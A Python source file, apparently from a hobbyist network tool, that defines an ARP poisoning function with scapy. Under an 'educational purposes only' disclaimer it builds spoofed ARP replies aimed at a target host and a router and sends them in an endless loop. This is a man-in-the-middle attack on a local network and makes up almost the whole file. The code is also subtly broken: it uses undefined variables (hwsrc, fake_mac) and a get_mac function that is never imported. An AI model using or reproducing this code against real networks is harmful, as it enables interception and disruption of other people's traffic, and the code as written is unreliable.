""" Created by Samuel Quarm. Use ethically 
DISCLAIMER:
This tool is provided for educational and research purposes only.
Unauthorized use on networks you do not own or have explicit permission to test
may violate the law. The author is not responsible for misuse.
"""
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#ARP Poison function
#Imports
from scapy.all import IP, ARP, Ether, srp, sendp, conf, get_if_list, TCP, RandShort, RandIP, UDP, RandMAC
import ipaddress, socket, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import pyfiglet
from termcolor import colored
import netifaces
import ipaddress
from Identifiers import arpscan 
#variables in the rich library


console = Console()
#----------------------------------------------------------------------------------------------------------------------------------------------------------

#ARP Poisoning Function for Target Only
def arp_poison(target_ip, router_ip, router_mac):

    #automatically inserted target mac variabke
    
    target_mac = get_mac(target_ip)
    if not target_mac:
        console.print(f"[red] Could not resolve MAC for {target_ip}")
        return 

    #fake mac variable
    # fake_mac = "00:11:22:33:44:55"  
    
    #ARP Broadcast Packet
    packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=fake_mac, hwdst=router_mac, pdst=router_ip)
    packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, hwdst=target_mac, pdst=target_ip)
    iface = conf.iface

    console.print(f"[yellow]Poisoning {target_ip} and {router_ip}...")
    try:
        while True:
            sendp(packet_for_target, iface=iface, verbose=0, count=1)  
            sendp(packet_for_router, iface=iface, verbose=0, count=1)
            time.sleep(2)


            console.print("[green]ARP Poisoning packets sent successfully.\n")
            console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
    except Exception as e:
        console.print("[Red] Failed to Send Poisoning Packets. Please Try Again. \n")



#----------------------------------------------------------------------------------------------------------------------------------------------------------

